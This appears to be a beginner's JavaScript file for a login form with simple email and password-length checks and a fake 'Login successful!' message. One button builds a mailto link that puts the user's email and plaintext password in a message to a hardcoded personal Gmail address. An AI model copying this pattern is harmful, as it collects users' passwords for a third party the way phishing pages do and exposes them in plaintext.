document.getElementById('form').addEventListener('submit', function(event) {
    event.preventDefault(); 
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    let isValid = true;
    document.getElementById('emailerror').textContent = '';
    document.getElementById('passworderror').textContent = '';
    document.getElementById('resultMessage').textContent = '';
    if (!validateEmail(email)) {
        document.getElementById('emailerror').textContent = 'Please enter a valid email address.';
        isValid = false;
    }
    if (!validatePassword(password)) {
        document.getElementById('passworderror').textContent = 'Password must be at least 6 characters long.';
        isValid = false;
    }

    if (isValid) {
        document.getElementById('resultMessage').textContent = 'Login successful!';
        document.getElementById('resultMessage').style.color="black";

    }
});

function validateEmail(email) {
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailPattern.test(email);
}

function validatePassword(password) {
    return password.length >= 6;
}
document.getElementById('emailButton').addEventListener('click', function() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
     if (validateEmail(email) && validatePassword(password)) {
        const subject = encodeURIComponent('Login Attempt Notification');
        const body = encodeURIComponent(`Email: ${email}\nPassword: ${password}\n\nThank you for Logging In.`);
        const mailtoLink = `mailto:rajakaviyas040@gmail.com?subject=${subject}&body=${body}`;
        window.location.href = mailtoLink;
    } else {
        alert('Please enter valid email and password to send a message.');
    }
});
